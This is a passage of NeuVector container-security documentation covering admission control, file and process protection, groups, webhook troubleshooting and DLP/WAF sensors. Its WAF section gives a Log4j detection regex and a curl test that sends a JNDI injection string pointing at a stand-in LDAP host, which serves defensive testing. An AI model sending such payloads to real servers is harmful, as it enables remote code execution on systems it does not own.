timeout setting, change your password and do other administrative profile edits.  Icon Descriptions in Legend &gt; Network Activity​  You can toggle the Legend on/off in the tools box of the Network Activity map.  Here is what the icons mean:  External network​  This is any network outside the NeuVector cluster. This could include internet public access or other internal networks.  Namespace​  Namespace in Kubernetes or Project in OpenShift  Group/Container/Service Mesh in discovery​  This container is in Discover mode, where connections to/from it are learned and whitelist rules will automatically be created.  Group/Container/Service Mesh being monitored​  This container is in Monitor mode, where violations will be logged but not blocked.  Group/Container/Service Mesh being protected​  This container is in Protect mode, where violations will be blocked.  Container Group​  This represent a group of containers in a service. Use this to provide a more abstract view if there are many container instances for a service/application (i.e. from the same image).  Un-managed node​  This node has been detected but does not have a NeuVector enforcer on it.  Un-managed container​  This container has been detected but is not on a node with a NeuVector enforcer on it. This could also represent some system services.  Exited Container​  This container is not running but in an 'exited' state.  IP group​  This is a group of IP Addresses.  Normal Conversation​  Allowed, whitelisted connections are displayed in blue.  Internal Conversation​  A connection within a service is shown in light gray.  Conversation with warning​  A connection which has generated a violation alert is shown in lighter red.  Conversation being blocked​  If a connection is a violation, as shown in red, and has been blocked by NeuVector, the arrow will have an ‘x’ in it.  Quarantined container​  Containers with a red circle around them have been quarantined. To un-quarantine, right-click on the container and select the un-quarantine button.

The following is an example of an admission control configuration that requires a deployment's image be signed by an appropriate key or identity.  First, configure a root of trust. This can either be a public or private root of trust, depending on the Sigstore deployment used to generate signatures. If you have deployed your own instances of Sigstore's services, select the private root of trust option.  A public root of trust does not need any additional configuration outside of giving it an easily referenced name.    A private root of trust requires the the keys and/or certificates from your privately deployed instances of Sigstore's services.    Next, for a given root of trust, configure each of the verifiers that you would like to use during admission control. There are two types of verifiers: keypair and keyless. A keypair verifier would be used when trying to verify an image signed by a user-defined private key. A keyless verifier would be used when verifying a signature generated by Sigstore's keyless pattern. More information about the Sigstore signing methods can be seen here.  To configure a keypair verifier, provide a name, and a public key corresponding to a target private key.    To configure a keyless verifier, provide the OIDC issuer and identity used during signing.    Note that after root-of-trust and verifier configuration, an image must be scanned in order to determine which verifiers the given image's signatures satisfy.  The configured verifiers that an image satisfies can be viewed in the upper right section of a given image's scan results in Assets-&gt;Registries. If an image is not signed by a verifier, it will not appear in its scan results.    To reference a particular root of trust and verifier in an admission control rule, join the two names with a forward slash like so: my-root-of-trust/my-verifier.

And the following Federated Network Rule has been created to allow access of SSL from the node demo pods to google.com.    After these rules and groups have been propagated to the remote cluster(s), they will appear as Federated rules and groups in the local cluster's console.    In the above example, the Federated rule is shown which is different than learned rules and 'user created' rules which were created in the local cluster. The user created rule 1 can be selected for editing or deletion while the Federated can not. In addition, Federated network rules will always show at the top of the list, thus taking precedence over other rules.  Other rules such as Admission Control, Response, Process and File will behave in the same way, except that the order of rules is only relevant for the Network rules.  Note that the configuration of Process and File rules requires the selection of a Federated Group, as these must be applied to a target group as defined in the Federated Group tab. After a new Group has been configured in Federated -&gt; Groups, it will show as a selectable option when configuring a group in Process or File rules.

One is Zero-drift, where allowed process and file activity are automatically determined based on the container image, and second is a behavioral learning based. Each can be customized (rules added manually) if desired.  NeuVector has built-in detection of suspicious file system activity. Sensitive files in containers normally do not change at run-time. By modifying the content of the sensitive files, an attacker can gain unauthorized privileges, such as in the Dirty-Cow linux kernel attack, or damage the system’s integrity, for example by manipulating the /etc/hosts file. Most containers don't run in read-only mode. Any suspicious activity in containers, hosts, or the NeuVector Enforcer container itself will be detected and logged into Notifications -&gt; Security Events.  Zero-drift File Protection​  This is the default mode for process and file protections. Zero-drift automatically allows only processes which originate from the parent process that is in the original container image, and does not allow file updates or new files to be installed. When in Discover or Monitor mode, zero-drift will alert on any suspicious process or file activity. In Protect mode, it will block such activity. Zero-drift does not require file activity to be added to an allow-list. Disabling zero-drift for a group will cause the process and file rules listed for the group to take effect instead.  note The process/file rules listed for each group are always applied, even when zero-drift is enabled. This offers a way to add allow/deny exceptions to the base zero-drift protections. Keep in mind that if a group starts in Discover mode, process/file rules can be automatically added to the list, and should be reviewed and edited before moving to Monitor/Protect modes.  The ability to enable/disable zero-drift mode is in the console in Policy -&gt; Groups. Multiple groups can be selected to toggle this setting for all selected groups.  Basic File Protections​  If a package installation is detected, an automatic re-scan of the container or host will be triggered to detect any vulnerabilities, IF auto-scan has been enabled in Security Risks -&gt; Vulnerabilities.  In addition to monitoring predefined files/directories, users can add custom files/directories to be monitored, and block such files/directories from being modified.  important NeuVector alerts, and does not block modifications to predefined files/directories or in system containers such as Kubernetes ones. Blocking is only an option for user configured custom files/directories for non-system containers. This is so that regular updates of system folder or sensitive configurations are not blocked unintentionally, resulting in erratic system behavior.  The following files and directories are monitored by default:  Executable filesSensitive setuid/setgid filesSystem libraries, libc, pthread, ...Package installation, Debian/Ubuntu, RedHat/CentOS, AlpineSensitive system files, /etc/passwd, /etc/hosts, /etc/resolv.conf …Running processes' executable files  The following activities are monitored:  Files, directories, symlinks (hard link and soft link)created, deleted, modified (content change) and moved  Below is a list of the file system monitoring and what is monitored (container, host/node, and/or NeuVector enforcer container itself):  /bin, /usr/bin, /usr/sbin, /usr/local/bin - container, enforcerFiles of setuid and setgid attribute - container, host, enforcerLibraries: libc, pthread, ld-linux.* - container, host, enforcerPackage installation: dpkg, rpm, apk - container, host, enforcer/etc/hosts, /etc/passwd, /etc/resolv.conf - container, host, enforcerBinaries of the running processes - container  Behavioral-learning based Allowed Applications in Discover Mode​  When in Discover mode, NeuVector can learn and whitelist applications ONLY for specified directories or files. To enable learning, a custom rule must be created and the Action must be set to Block, as described below.  Creating Custom File/Directory Monitoring Rules​  Custom file access rules can be created for both custom user-defined Groups as well as auto-learned Groups.  Users can add new entries for file/directory rules.  Filter: Configure the file/folder to be protected (wildcards are supported)Set the recursive flag (if all files in the subdirectories are to be protected)Select the action, Monitor or Block (see Actions below)Enter allowed applications (see Note1 below)    Actions:  Monitor file changes. Generate alerts (Notifications) for any changesBlock unauthorized access. Service in Discover mode: the file access behavior is learned (the processes/applications that access the protected file) and added to the Allowed Applications.Service in Monitor mode: unexpected file behavior is alerted.Service in Protect mode: unexpected access (read, modify) is blocked. New file creation in protected folders will be blocked as well.  note If the rule is set to Block, and the service is in Discover mode, NeuVector will learn the applications accessing the file and add these to the Allowed Applications for the rule.  note Container platforms running the AUFS storage driver will not support the deny (block) action in Protect mode for creating/modifying files due to the limitations of the driver. The behavior will be the same a Monitor mode, alerting upon suspicious activity.  File access rule order precedence​  A container can inherit file access rule from multiple custom groups and user created file access rule on auto learned group.  File access rules are prioritized in the order below if the file name conflicts with predefined access rules of auto learned group and rules inheritance of multiple groups.  File access rule with block access (highest order)File access rule with recursive enabledFile access rule with recursive disableUser created file access rule other than predefined file access rules  Examples​  Showing file access rule to protect /etc/hostname file of node-pod service and allow vi application to modify the file.    Showing file access rule to protect files under /var/opt/ directory recursively for modification as well reading. The Allowed Application python can have read and modify access to these files.    Showing access rule that protects file /etc/passwd, which is one of the files covered predefined access rule in order to modify the file access action, for modification as well reading. This custom rule changes the default action of the predefined file access rule. The application Nano can have 'read and modify' access to these files. Must also add the Nano application (process) as an 'allow' rule in the process profile rule for this service to run Nano application inside the service (if it wasn't already whitelisted there), otherwise the process will be blocked by NeuVector.    Showing that the application python was learned accessing file under /var/opt directory when service mode of node-pod was in Discover. This occurs only when the rule is set to Block and the service is in Discover mode.    Showing predefined file access rules for the service node-pod.demo-nvqa. This can be viewed for this service by clicking the info icon “show predefined filters” in the right corner of the file access rule tab.    Showing a sample security event in Notifications -&gt; Security Events, alerted as File access denial when modification of the file /etc/hostname by the application python was denied due to a custom file access rule with block action.    Other Responses​  If other special mitigations, responses, or alerts are desired for File System Violations, a Response Rule can be created. See the example below and the section Run-Time Security Policy -&gt; Response Rules for more details.

It is also used to switch modes of Groups between Discover, Monitor, and Protect. Container Groups can have Process/File rules in a different mode than Network rules, as described here. Please see the following individual sections for explanations of Custom Compliance Checks, Network Rules, Process and File Access Rules and DLP/WAF detection. Note: Network rules can be viewed in the Groups menu for any group, but must be edited separately in the Network Rules menu.  NeuVector automatically creates Groups from your running applications. These groups start with the prefix 'nv.' You can also manually add them using a CRD or the REST API and can be created in any mode, Discover, Monitor, or Protect. Network and Response Rules require these Group definitions. For automatically created Groups ('learned' groups starting with 'nv'), NeuVector will learn the network and process rules and add them while in Discover mode. Custom Groups will not auto-learn and populate rules. Note: 'nv.' groups start with zero drift enabled by default for process/file protections.    It is convenient to see groups of containers and apply rules to each group. NeuVector creates a list of groups based on the container images. For example, all containers started from one Wordpress image will be in the same group. Rules are automatically created and applied to the group of containers.  The Groups screen also displays a 'Scorable' icon in the upper right, and a learned group can be selected and the Scorable checkbox enabled or disabled. This controls which containers are used to calculate the Security Risk Score in the Dashboard. See Improve Security Risk Score for more details.  The Groups screen is also where the CRD yaml file for 'security policy as code' can be imported and exported. Select one or more groups and click on the Export Group policy button to download the yaml file. See the CRD section for more details on how to use CRDs. Important: Each selected group AND any linked groups through network rules will be exported (i.e. the group and any other group it connects to through the whitelist network rules).  Auto Deletion of Unused Groups​  Learned groups (not reserved or custom groups) can be automatically deleted by NeuVector if there are no members (containers) in the group. The time period for this is configurable in Settings -&gt; Configuration.  Host Protection - the 'Nodes' Group​  NeuVector automatically creates a group called 'nodes' which represents each node (host) in the cluster. NeuVector provides automated basic monitoring of hosts for suspicious processes (such as port scans, reverse shells etc.) and privilege escalations. In addition, NeuVector will learn the process behavior of each node while it is in Discover mode to whitelist those processes, similar to how it is done with container processes. The 'local' (learned) process rule list is a combination of all processes from all nodes in the cluster while in Discover mode.  The nodes can then be put into the Monitor or Protect mode, where NeuVector will alert is any process starts while in Monitor mode, and block that process in Protect mode.    To enable host protection with process profile rules, select the 'nodes' group and review the learned processes on the node. Customize if needed by adding, deleting or editing process rules. Then switch the mode to Monitor or Protect.  note Network connection violations of rules shown in the Network Rules for Nodes are never blocked, even in Protect mode. Only process violations are blocked in Protect mode on nodes.  Custom Groups​  Groups can be manually added by entering the criteria for the group. Note: Custom created groups don't have a Protection mode. This is because they may contain containers from different underlying groups, each of which may be in a different mode, causing confusion about the behavior.  Groups can be created by:  Images  Select containers by their image names. Examples: image=wordpress, image@redis  Nodes  Select containers by nodes on which they are running. Examples: node=ip-12-34-56-78.us-west-2  Individual containers  Select containers by their instance names. Examples: container=nodejs_1, container@nodejs  Services  Select containers by their services. If a container is deployed by Docker Compose, its service tag value will be &quot;project_name:service_name&quot;; if a container is deployed by Docker swarm mode service, its service tag value will be the swarm service name.  Labels  Select containers by their labels. Examples: com.docker.compose.project=wordpress, location@us-west  Addresses  Create a group by DNS name or IP address ranges. Examples: address=www.google.com, address=10.1.0.1, address=10.1.0.0/24, address=10.1.0.1-10.1.0.25. DNS name can be any name resolvable. Address criteria do not accept the != operator. See below for special virtual host 'vh' address groups.  A group can be created with mixed criteria types, except the 'address' type, which cannot be used together with other criteria. Mixed criteria enforces an ‘AND’ operation between the criteria, for example label service_type=data AND image=mysql. Multiple entries for one or criteria are treated as OR, for example address=google.com OR address=yahoo.com. Note: To assist in analyzing ingress/egress connections, a list of ingress and egress IPs can be downloaded from the Dashboard -&gt; Ingress/Egress details section as an Exposure Report.  Partial matching is supported for image, node, container, service and label criteria. For example, image@redis, selects containers whose image name contains 'redis' substring; image^redis, selects containers whose image name starts with 'redis'.  It is not recommended to use address criteria to match internal IPs or subnets, especially those protected by enforcers, instead, using their meta data, such as image, service or labels, is recommended. The typical use cases for address group are to define policies between managed containers and external IP subnets, for example, services running on Internet or another data center. Address group does not have group members.  Wildcards '' can be used in criteria, for example 'address=.google.com'. For more flexible matching, use the tilde '' to indicate a regex match is desired. For example to match labels 'policypublic.*-ext1' for the label policy.  note Special characters used after an equals '=' in criteria may not match properly. For example the dot '.' In 'policy=public.' will not match properly, and regex match should be used instead, like 'policy~public.'  After saving a new group, NeuVector will display the members in that group. Rules can then be created using these groups.  Virtual Host ('vh') Based Network Policy​  Custom groups can support virtual host based address groups. This enables a use case where two different FQDN addresses are resolved to the same IP address, but different rules for each FQDN should be enforced. A new custom group with ‘address=vh:xxx.yyy’ can be created using the ‘vh:’ indicator to enable this protection. A network rule can then use the custom group as the ‘From’ source based on the virtual hostname (instead of resolved IP address) to enforce different rules for virtual hosts.

These include CVE High Count, CVE Names, image labels, imageScanned, namespace, user, runAsRoot, etc. There are two possible sources of criteria evaluation, Image Scans and Deployment Yaml file scans. If a criterion requires an image scan, the scan results from Registry Scanning will be used. If the image was not scanned, the admission control rule will not be applied. If a criterion requires scanning of the deployment yaml, it will be evaluated from the Kubernetes deployment. Some criteria will use the results from either an image scan OR a deployment yaml scan.

Before NeuVector performs the match against the Admission Control rules, NeuVector retrieves the image information (For example, 10.1.127.3:5000/neuvector/toolbox/iperf:latest) from the cluster apiserver (Please refer to Request from apiserver section below). The image is composed by registry server (https://10.1.127.3:5000), repository (neuvector/toolbox/iperf) and tag (latest).  NeuVector uses this information to match the results in NeuVector Assets -&gt; Registry scan page and collects the corresponding information such as cve name, cve high or medium count etc. Image compliance violations are considered any image which has secrets or setuid/setgid violations. If users are using the image from docker registry to create a cluster resource, normally the registry server information is empty or docker.io and currently NeuVector is using the following hard-coded registry servers to match the registry scan result instead of empty or docker.io string. Of course, if there are more other than the following supported docker registry servers defined in the registry scan page, NeuVector is unable to get the registry scan results successfully.  If users are using the built-in image such as alpine or ubuntu from the docker registry, there is a hidden organization name called library. When you look at the results for docker build-in image in NeuVector Assets &gt; Registry scan page, the repository name will be library/alpine or library/ubuntu. Currently NeuVector assumes there is only one hidden library organization name in docker registry. If there is more than one, NeuVector is unable to get the registry scan results successfully as well. The above limitation could also apply on other type of docker registry servers if any.  Creating Custom Criteria Rules​  Users can create a customized criterion to be used to allow or block deployments based on common objects found in the image yaml (scanned upon deployment). Select the object to be used, for example imagePullSecrets and the matching value, for example exists. It is also recommended to use additional criteria to further target the rule, such as namespace, PSP/PSA, CVE conditions etc.    Criteria Explanations​  Criteria with a disk icon require that the image be scanned (see registry scanning), and criteria with a file icon will scan the deployment yaml. If both icons are listed, then matching will be for either (OR). If a criterion requires an image scan, but the image is NOT scanned, that part of the rule will be ignored (ie rule is bypassed, or if deployment yaml is also listed, then only the deployment yaml will be used to match). To prevent non-scanned images from bypassing rules, see the Image Scanned criterion below.   Add customized criterion. Select the object from the drop down. All custom criteria support exists and does not exist operators. For ones that allow values, additional operators and the value can be entered. Values can be static, separated by comma’s, and include wildcards. Allow Privilege Escalation. If the container allows privilege escalations, it can be blocked by setting Deny as the action. Count of High Severity CVE. This takes the results of an image (registry) scan and matches on the number of High severity (CVSS scores of 7 or higher). Additional operator can be added to restrict to CVEs reported a certain number of days prior, giving time for remediation for recent CVEs. Count of High Severity CVE with fix. This takes the results of an image (registry) scan and matches on High severity (CVSS scores of 7 or higher), AND if there is a fix available for the CVE. Select this if only planning to block deployments of high CVEs if a fix should have been applied. Additional operator can be added to restrict to CVEs reported a certain number of days prior, giving time for remediation for recent CVEs. Count of Medium Severity CVE. This takes the results of an image (registry) scan and matches on the number of Medium severity (CVSS scores of between 4 and 6). Additional operator can be added to restrict to CVEs reported a certain number of days prior, giving time for remediation for recent CVEs. CVE names. This matches on specific CVE names (e.g. CVE-2023-23914, 2023-23914, 23914, or unique text) where multiple are separated by comma’s. CVE score. Configure both the minimum score as well as the number of CVEs matching or exceeding the minimum CVSS score. Environment variables with secrets. If the deployment yaml or image scan result contains (or does not contain) any environment variables with secrets. See the criteria for secrets matching below. Environment variables. Use this to require or exclude certain environment variables in the deployment yaml or image scan. Image. Matching on specific image names, typically combined with other criteria for the rule. Image compliance violations. Matches if the image (registry) scan results in any compliance violations. See compliance for details on compliance checks. Image without OS information. Matches if the image (registry) scan results in the inability to retrieve OS information. Image registry. Matches on specific image registry names. Typically used to restrict deployments from certain registries or require deployments only from certain approved registries. Often used with other criteria such as namespaces. Image scanned. Require that an image be scanned. Often used to make sure all images are scanned to ensure that scan based criteria such as high CVEs can be applied to deployments. Image signed. Require that an image be signed through the integration of Sigstore/Cosign. This criteria simply checks whether there is any verifier in the scan result.Image Sigstore Verifiers. Require that an image be signed by a specific Sigstore root-of-trust name, as configured in Assets -&gt; Sigstore Verifiers. Checks whether the verifiers in the scan result match the verifiers in the rule configuration.Labels. Require that one or more labels be present in the deployment yaml or image scan results. Modules. Requires or excludes certain modules (packages, libraries) from being present in the image as the result of the image (registry) scan. Mount volumes. Typically used to prevent certain volumes from being mounted. Namespace. Allow or restrict deployments for certain namespace(s). Used independently but often combined with other criteria to limit the rule matching to namespace. PSP Best Practice. Equivalent rules for PSP (note: PSP is completely removed from kubernetes 1.25+, however this NeuVector equivalent may still used in 1.25+). Includes Run as privileged, Run as root, Share host's PID namespaces, Share host's IPC namespaces, Share host's Network, Allow Privilege Escalation. Resource Limit Configuration (RLC). Requires resource limits to be configured for CPU Limit/Request, Memory Limit/Request, and can require operator to be &gt; or &lt;= a configured resource value. Run as privileged. Typically used to limit or block deployments of privileged containers. Run as root. Typically used to limit or block deployments of containers run as root.. Service Account Bound High Risk Role. Can match on multiple criteria which could respresent a high risk service account role, including listing secrets, performing any operations on workloads, modification of RBAC resources, creation of workload resources, and allowing exec into a container. Share host’s IPC namespaces. Matches on IPC namespaces. Share host’s Network. Allow or disallow deployments to share the host’s network. Share host’s PID namespaces . Matches on PID namespaces. User. Allow or disallow defined users bound by kubernetes at run-time, visible in the userInfo field. Note: The yaml (upload) auditing function will not be able to check this because it is bound at run-time. User groups. Allow or disallow defined user groups bound by kubernetes at run-time, visible in the userInfo field. Note: The yaml (upload) auditing function will not be able to check this because it is bound at run-time. Violates PSA policy. Matches if the deployment violates either a Restricted or Baseline PSA Pod Security Standard (equivalent to PSA definitions in kubernetes 1.25+)   Secrets detection​  Detection of secrets, for example in environment variables is matched used the following regex:  Rule{Description: &quot;Password.in.YML&quot;, Expression: `(?i)(password|passwd|api_token)\\S{0,32}\\s*:\\s*(?-i)([0-9a-zA-Z\\/+]{16,40}\\b)`, ExprFName: `.*\\.ya?ml`, Tags: []string{share.SecretProgram, &quot;yaml&quot;, &quot;yml&quot;}, Suggestion: msgReferVender},   A list of types of secrets detected can be found here   ","version":"5.2","tagName":"h3"},{"title":"Admission Control Modes​","type":1,"pageTitle":"Admission Controls","url":"/5.2/policy/admission#admission-control-modes","content":" There are two modes NeuVector supports - Monitor and Protect.

Review Admission Control Configurations​  First, check your Kubernetes or OpenShift version. Admission control is supported in Kubernetes 1.9+ and OpenShift 3.9+. For OpenShift, make sure you have edited the master-config.yaml to add the MutatingAdmissionWebhook configuration and restarted the master api-servers.  Check the Clusterrole  kubectl get clusterrole neuvector-binding-admission -o json   Make sure the verbs include:   &quot;get&quot;, &quot;list&quot;, &quot;watch&quot;, &quot;create&quot;, &quot;update&quot;, &quot;delete&quot;   Then check:  kubectl get clusterrole neuvector-binding-app -o json   Make sure the verbs include:   &quot;get&quot;, &quot;list&quot;, &quot;watch&quot;, &quot;update&quot;   If the above verbs are not listed, the Test button will fail.  Check the Clusterrolebinding  kubectl get clusterrolebinding neuvector-binding-admission -o json   Make sure the ServiceAccount is set properly:  &quot;subjects&quot;: [ { &quot;kind&quot;: &quot;ServiceAccount&quot;, &quot;name&quot;: &quot;default&quot;, &quot;namespace&quot;: &quot;neuvector&quot;   Check the Webhook Configuration  kubectl get ValidatingWebhookConfiguration --as system:serviceaccount:neuvector:default -o yaml &gt; nv_validation.txt   The nv_validation.txt should have similar content to:  apiVersion: v1 items: - apiVersion: admissionregistration.k8s.io/v1beta1 kind: ValidatingWebhookConfiguration metadata: creationTimestamp: &quot;2019-09-11T00:51:08Z&quot; generation: 1 name: neuvector-validating-admission-webhook resourceVersion: &quot;6859045&quot; selfLink: /apis/admissionregistration.k8s.io/v1beta1/validatingwebhookconfigurations/neuvector-validating-admission-webhook uid: 3e1793ed-d42e-11e9-ba43-000c290f9e12 webhooks: - admissionReviewVersions: - v1beta1 clientConfig: caBundle: {.........................} service: name: neuvector-svc-admission-webhook namespace: neuvector path: /v1/validate/{.........................} failurePolicy: Ignore name: neuvector-validating-admission-webhook.neuvector.svc namespaceSelector: {} rules: - apiGroups: - '*' apiVersions: - v1 - v1beta1 operations: - CREATE resources: - cronjobs - daemonsets - deployments - jobs - pods - replicasets - replicationcontrollers - services - statefulsets scope: '*' - apiGroups: - '*' apiVersions: - v1 - v1beta1 operations: - UPDATE resources: - daemonsets - deployments - replicationcontrollers - statefulsets - services scope: '*' - apiGroups: - '*' apiVersions: - v1 - v1beta1 operations: - DELETE resources: - daemonsets - deployments - services - statefulsets scope: '*' sideEffects: Unknown timeoutSeconds: 30 kind: List metadata: resourceVersion: &quot;&quot; selfLink: &quot;&quot;   If you see any content like &quot;Error from server ....&quot; or &quot;... is forbidden&quot;, it means the NV controller service account doesn't have access right for ValidatingWebhookConfiguration resource. In this case it usually means the neuvector-binding-admission clusterrole/clusterrolebinding has some issue. Deleting and recreating neuvector-binding-admission clusterrole/clusterrolebinding usually the fastest fix.  Test the Admission Control Connection Button  In the NeuVector Console in Policy -&gt; Admission Control, go to More Operations -&gt; Advanced Setting and click the &quot;Test&quot; button. NeuVector will modify service neuvector-svc-admission-webhook and see if our webhook server can receive the change notifification or if it fails.  Run  kubectl get svc neuvector-svc-admission-webhook -n neuvector -o yaml   The output should look like:  apiVersion: v1 kind: Service metadata: annotations: ................... creationTimestamp: &quot;2019-09-10T22:53:03Z&quot; labels: echo-neuvector-svc-admission-webhook: &quot;1568163072&quot; //===&gt; from last test. could be missing if it's a fresh NV deployment tag-neuvector-svc-admission-webhook: &quot;1568163072&quot; //===&gt; from last test. could be missing if it's a fresh NV deployment name: neuvector-svc-admission-webhook namespace: neuvector ................... spec: clusterIP: 10.107.143.177 ports: - name: admission-webhook port: 443 protocol: TCP targetPort: 20443 selector: app: neuvector-controller-pod sessionAffinity: None type: ClusterIP status: loadBalancer: {}   Now click admission control's advanced setting =&gt; &quot;Test&quot; button. Wait until it shows success or failure. NeuVector will modify the service neuvector-svc-admission-webhook's tag-neuvector-svc-admission-webhook label implicitly. Wait for controller internal operation. If the NeuVector webhook server receives update request from kube-apiserver about this service change, NeuVector will modify the service neuvector-svc-admission-webhook's echo-neuvector-svc-admission-webhook label to the same value as tag-neuvector-svc-admission-webhook label.

Check if neuvector-binding-app clusterrole/clusterrolebinding are configured correctly. After the test, if the value of label tag-neuvector-svc-admission-webhook is changed but not the value of label echo-neuvector-svc-admission-webhook, it means the webhook server didn't receive the request from the kube-apiserver. The kub-apiserver's request can't reach the NeuVector webhook server. The cause of this could be network connectivity issues, firewalls blocking the request (on default port 443 in), the resolving of the wrong IP for the controller or others.

NeuVector uses a regular expression (regex) based engine to perform packet filtering functions. Extreme care should be taken when applying sensors to container traffic, as the filtering function incurs additional system overhead and can impact performance of the host.  DLP and WAF filtering are applied differently depending on the group(s) to which they are applied. In general, WAF filtering is applied to inbound and outbound connections except for internal traffic where only inbound filtering is applied. DLP filtering applies to inbound and outbound connections from a 'security domain', but not any internal connections within a security domain. See the detailed descriptions below.  Configuring DLP or WAF is a two step process:  Define and test the sensor(s), which is the set of regular expressions used to match the header, URL, or entire packet.Apply the desired sensor to a Group, in the Policy -&gt; Groups screen.  WAF Sensors​  WAF sensors represent inspection of network traffic to/from a pod/container. These sensors can be applied to any applicable group, even custom groups (e.g. namespace groups). Incoming traffic to ALL containers within the group will be inspected for WAF rule detection. In addition, any outbound (egress) connections external to the cluster will be inspected.  This means that, while this feature is named WAF, it is useful and applicable to any network traffic, not only web application traffic, and therefore provides broader protections than simple WAFs. For example, API security can be enforced on outbound connections to an external api service, allowing only GET requests and blocking POSTs.  Also note that, while similar to DLP, the inspection is for incoming traffic to EVERY pod/container within the group, while DLP applies inspection to incoming and outgoing traffic from the group only (i.e. the security boundary), not internal traffic in the group (e.g. not east-west within a Group's containers).    DLP Sensors​  DLP Sensors are the patterns that are used to inspect traffic. Built in sensors such as credit card and U.S. social security have predefined regular expressions. You can add custom sensors by defining regex patterns to be used in that sensor. Note that, while similar to WAF, DLP applies inspection to incoming and outgoing traffic from the group only (i.e. the security boundary), not internal traffic in the group (e.g. not east-west within a Group's containers). WAF inspection is for incoming traffic only to EVERY pod/container within the group.    Configuring DLP and WAF sensors​  The configuration of DLP and WAF sensors is similar. Create a sensor Name and any comment, then select the sensor to Add or Edit the rules for that sensor. Key fields include:  Have/Not Have. Determines if the match requires the pattern to be found (Have) in order to take the action (e.g. Deny), or only if the pattern does not exist (Not Have) should the action be taken. It is recommended that the &quot;Not Have&quot; operator be combined in the rule with a pattern using the &quot;Have&quot; operator because a single pattern with &quot;Not Have&quot; operator will not be effective.Pattern. This is the regular expression used to determine a match. You can test your regex against sample data to ensure correct Have/Not Have results.Context. Where to look for the pattern match. Choose packet for the broadest inspection of the entire network connection, or narrow the inspection to the URL, header, or body only.    Each DLP/WAF rule supports multiple patterns (max 16 patterns are allowed per rule). Multiple patterns as well as setting the rule context can also help reduce false positives.  Example of a DLP rule with a Have/Not Have pattern: Have:  \\b3[47]\\d{2}([ -]?)(?!(\\d)\\2{5}|123456|234567|345678)\\d{6}\\1(?!(\\d)\\3{4}|12345|56789)\\d{5}\\b   This produces a false positive match for &quot;istio_agent_go_gc_duration_seconds_sum 22.378386247999998&quot;:  docker exec -ti httpclient sh / # curl -d &quot;{\\&quot;context\\&quot;: \\&quot;istio_agent_go_gc_duration_seconds_sum 22.378386247999998\\&quot;}&quot; 172.17.0.5:8080/ Hello, world!   Adding a Not Have pattern removes the false positive:  istio\\_(\\w){5}   Sensors must be applied to a Group to become effective.  Applying DLP/WAF Sensors to Container Groups​  To activate a DLP or WAF sensor, go to Policy -&gt; Groups to select the group desired. Enable DLP/WAF for the Group and add the sensor(s).  It is recommended that DLP sensors be applied to the boundary of a security zone, defined by a Group, to minimize the impact of DLP inspection. If needed, define a Custom Group that represents such a security zone. For example, if the Group selected is the reserved group 'containers', and DLP sensors added to the group, only traffic in or out of the cluster and not between all containers will be inspected. Or if it is a custom group defined as 'namespace=demo' then only traffic in or out of the namespace demo will be inspected, and not any inter-container traffic within the namespace.  It is recommended that WAF sensors be applied only to Groups where incoming (e.g. ingress) connections are expected, unless the sensor(s) apply to specific internal applications (expecting east-west traffic).    DLP/WAF Behavior Summary  DLP pattern matching does not occur for the traffic which is passing among workloads that belong to same DLP group.Any traffic passing in and out of a DLP group is scanned for pattern matches.Cluster ingress and egress traffic is scanned for patterns if the workload is allowed to make ingress/egress connections.Multiple patterns per DLP/WAF rule (max 16 patterns are allowed per rule).Multiple alerts are generated for a single packet if it matches multiple rules.For performance reasons, only the first 16 rules are alerted and matched even if the packet matches more than 16 rules.Alerts are aggregated and reported together if same rule matches and alerts multiple times within 2 seconds.PCRE is used for pattern matching.Hyper scan library is used for efficient, scalable and high-performance pattern matching.  DLP/WAF Actions in Discover, Monitor, Protect Modes​  When adding sensors to groups, the DLP/WAF action can be set to Alert or Deny, with the following behavior if there is a match:  Discover mode. The action will always be to alert, regardless of the setting Alert/Deny.Monitor mode. The action will always be to alert, regardless of the setting Alert/Deny.Protect mode. The action will be to alert if set to Alert, or block if set to Deny.  Log4j Detection WAF Pattern​  The WAF-like rule to detect the Log4j attempted exploit is below. Please note this should only be applied to Groups expecting ingress web connections.  \\$\\{((\\$|\\{|\\s|lower|upper|\\:|\\-|\\})*[jJ](\\$|\\{|\\s|lower|upper|\\:|\\-|\\})*[nN](\\$|\\{|\\s|lower|upper|\\:|\\-|\\})*[dD](\\$|\\{|\\s|lower|upper|\\:|\\-|\\})*[iI])((\\$|\\{|\\s|lower|upper|\\:|\\-|\\})|[ldapLDAPrmiRMIdnsDNShttpHTTP])*\\:\\/\\/.*   Also note that there are ways that attackers could bypass detection by such rules.  Testing the Log4j WAF Detection​  In an attempted exploit, the attacker will construct an initial jndi: insertion and include it in the User-Agent HTTP Header:  User-Agent: ${jndi:ldap://enq0u7nftpr.m.example.com:80/cf-198-41-223-33.cloudflare.com.gu}   Using curl to POST data to server(container) can help to test WAF rule:  curl -X POST -k -H &quot;X-Auth-Token: $_TOKEN_&quot; -H &quot;Content-Type: application/json&quot; -H &quot;User-Agent: ${jndi:ldap://enq0u7nftpr.m.example.com:80/cf-198-41-223-33.cloudflare.com.gu}&quot; -d '$SOME_DATA' &quot;http://$SOME_IP_:$PORT&quot;   WAF Setup and Testing​  The downloadable file below provides an unsupported script for creating WAF sensors via CRD and running common WAF rule tests against those sensors.

NeuVector analyzes and protects based on not only IP address and port, but by determining the actual network behavior based on application protocols. This enables NeuVector to automatically protect any new application containers regardless of IP address and port.  Network rules specify ALLOWED or DENIED behavior for your applications.

Ingress IP Policy Based on XFF-FORWARDED-FOR​  In a Kubernetes cluster, an application can be exposed to the outside of the cluster by a NodePort, LoadBalancer or Ingress services. These services typically replace the source IP while doing the Source NAT (SNAT) on the packets. As the original source IP is masqueraded, this prevents NeuVector from recognizing the connection is actually from the 'external'.  In order to preserve the original source IP address, the user needs to add the following line to the exposed services, in the 'spec' section of the external facing load balancer or ingress controller. (Ref: https://kubernetes.io/docs/tutorials/services/source-ip/)  &quot;externalTrafficPolicy&quot;:&quot;Local&quot;   Many implementations of LoadBalancer services and Ingress controllers will add the X-FORWARDED-FOR line to the HTTP request header to communicate the real source IP to the backend applications. This product can recognize this set of HTTP headers, identify the original source IP and enforce the policy according to that.  This improvement created some unexpected issues in some setup. If the above line has been added to the exposed services and NeuVector network policies have been created in a way that expect the network connections are coming from internal proxy/ingress services, because we now identify the connections are from &quot;external&quot; to the cluster, normal application traffic might trigger alerts or get blocked if the applications are put in &quot;Protect&quot; mode.  A switch is available to disable this feature. Disabling it tells NeuVector not to identify that the connection is from &quot;external&quot; using X-FORWARDED-FOR headers. By default this is enabled, and the X-FORWARDED-FOR header is used in policy enforcement. To 